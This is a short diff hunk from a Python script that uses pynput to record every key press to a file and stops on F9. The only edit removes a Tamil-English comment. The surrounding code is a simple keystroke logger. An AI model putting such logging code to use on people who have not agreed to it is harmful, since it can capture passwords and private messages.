@@ -6,7 +6,7 @@ def on_press(key):
         f.write(str(key) + "\n")
 
 def on_release(key):
-    if key == Key.f9:  # F9 press பண்ணா stop!
+    if key == Key.f9:  
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
